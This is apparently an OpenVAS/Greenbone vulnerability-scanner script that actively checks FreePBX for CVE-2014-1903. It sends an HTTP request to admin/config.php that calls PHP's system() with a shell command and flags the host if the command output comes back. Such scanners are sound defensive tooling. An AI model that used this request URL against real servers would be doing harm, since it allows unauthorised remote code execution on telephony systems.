# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:freepbx:freepbx";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103920");
  script_version("2024-06-04T05:05:28+0000");
  script_tag(name:"last_modification", value:"2024-06-04 05:05:28 +0000 (Tue, 04 Jun 2024)");
  script_tag(name:"creation_date", value:"2014-03-14 11:41:40 +0100 (Fri, 14 Mar 2014)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2014-1903");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("FreePBX 2.9 - 12 RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_freepbx_http_detect.nasl");
  script_mandatory_keys("freepbx/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"FreePBX is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"admin/libraries/view.functions.php does not restrict the set of
  functions accessible to the API handler, which allows remote attackers to execute arbitrary PHP
  code via the function and args parameters to admin/config.php.");

  script_tag(name:"impact", value:"Successfully exploiting this issue will allow attackers to
  execute arbitrary code in the context of the affected application. Failed exploit attempts may
  result in a denial of service condition.");

  script_tag(name:"affected", value:"FreePBX versions 2.9, 2.10, 2.11 and 12.");

  script_tag(name:"solution", value:"Updates are available.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65509");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

cmds = exploit_commands( "linux" );
vtstrings = get_vt_strings();
vtstring = vtstrings["default"];

foreach pattern( keys( cmds ) ) {
  cmd = cmds[pattern];

  url = dir + "/admin/config.php?display=" + vtstring + "&handler=api&file=" + vtstring + "&module=" +
        vtstring + "&function=system&args=" + cmd;

  req = http_get( port:port, item:url );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

  if( result = egrep( pattern:pattern, string:res ) ) {
    report = 'By requesting the URL "' + url + '" the scanner received the following response:\n\n' + res;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
